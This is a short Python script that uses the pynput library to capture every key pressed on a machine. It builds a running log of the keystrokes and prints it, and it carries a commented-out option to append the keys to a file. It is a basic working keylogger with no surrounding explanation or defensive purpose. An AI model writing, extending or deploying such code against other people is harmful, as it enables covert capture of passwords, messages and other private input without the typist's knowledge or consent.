#!/usr/bin/python

import pynput.keyboard

log = ""
def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log +""
        else:
            log = log + " " + str(key) + " "
    print(log)
    #with open("log.txt","a") as fin:
     #   fin.write(str(key))

keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
    keyboard_listener.join()
        